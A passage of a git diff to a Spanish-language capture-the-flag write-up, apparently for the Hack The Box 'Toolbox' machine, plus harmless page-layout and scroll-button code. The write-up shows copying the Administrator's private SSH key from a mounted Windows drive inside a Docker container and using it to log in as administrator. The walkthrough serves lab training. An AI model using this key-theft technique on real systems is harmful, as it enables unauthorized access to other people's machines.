+a...entonces, esto es lo mismo que la máquina **Windows**, es una montura de sus archivos por así decirlo. Es posible que podamos conectarnos a **Windows** utilizando la **llave privada SSH**.
 
 <h2 id="Windows">Utilizando Llave Privada para Conectarnos a Windows por SSH</h2>
 
 Vamos a copiar la llave privada del directorio oculto **.ssh**:
-```
+```bash
 docker@box:/c/Users/Administrator$ cd .ssh                                     
 cd .ssh
 docker@box:/c/Users/Administrator/.ssh$ ls -la                                 
@@ -750,14 +891,16 @@ M7lArs4zgBzMGQleIskQvWTcKrQNdCDj9JxNIbhYLhJXgro+u5dW6EcYzq2MSORm
 ...
 ...
 ```
+
 Copia la llave privada en un archivo en tu máquina y dale cambia sus permisos o si no no funcionará:
-```
+```bash
 nano id_rsa
 
 chmod 600 id_rsa
 ```
+
 Ya por último, conéctate desde tu máquina, usando esa llave por el servicio **SSH**:
-```
+```bash
 ssh -i id_rsa Administrator@10.10.10.236                             
 The authenticity of host '10.10.10.236 (10.10.10.236)' can't be established.
 ED25519 key fingerprint is SHA256:KJAib23keV2B8xvFaxg7e79uztryW+LYX+Wb2qA9u4k.
@@ -770,8 +913,9 @@ Microsoft Windows [Version 10.0.17763.1039]
 administrator@TOOLBOX C:\Users\Administrator>whoami
 toolbox\administrator
 ```
+
 Excelente, la flag estará en el mismo lugar en donde la encontramos en el **Docker**:
-```
+```bash
 administrator@TOOLBOX C:\Users\Administrator>cd Desktop
 administrator@TOOLBOX C:\Users\Administrator\Desktop>dir
  Volume in drive C has no label.
@@ -793,10 +937,7 @@ Listo, ya terminamos esta máquina.
 <br>
 <br>
 <div style="position: relative;">
- <h2 id="Links" style="text-align:center;">Links de Investigación</h2>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h2 id="Links" style="text-align:center;">Links de Investigación</h2>
 </div>
 
 
@@ -804,7 +945,53 @@ Listo, ya terminamos esta máquina.
 * https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql
 * https://stackoverflow.com/questions/32646952/docker-machine-boot2docker-root-password
 * https://www.revshells.com/
+* https://help.dreamhost.com/hc/es/articles/360001435926-Instalar-OpenSSL-localmente-dentro-de-tu-usuario
 
 <br>
 # FIN
+
+<footer id="myFooter">
+    <!-- Footer para eliminar el botón -->
+</footer>
+
+<style>
+        #backToIndex {
+                display: none;
+                position: fixed;
+                left: 87%;
+                top: 90%;
+                z-index: 2000;
+                background-color: #81fbf9;
+                border-radius: 10px;
+                border: none;
+                padding: 4px 6px;
+                cursor: pointer;
+        }
+</style>
+
+<a id="backToIndex" href="#Indice">
+        <img src="/assets/images/arrow-up.png" style="width: 45px; height: 45px;">
+</a>
+
+<script>
+    window.onscroll = function() { showButton() };
+
+    function showButton() {
+        const scrollPosition = document.documentElement.scrollTop || document.body.scrollTop;
+        const indicePosition = document.getElementById("Indice").offsetTop;
+        const footerPosition = document.getElementById("myFooter").offsetTop;
+        const windowHeight = window.innerHeight;
+
+        const button = document.getElementById("backToIndex");
+
+        // Mostrar el botón si el usuario ha bajado al índice
+        if (scrollPosition >= indicePosition && (scrollPosition + windowHeight) < footerPosition) {
+            button.style.display = "block";
+            button.style.position = "fixed";
+            button.style.top = "90%";
+        } else {
+            button.style.display = "none";
+        }
+    }
+</script>
 
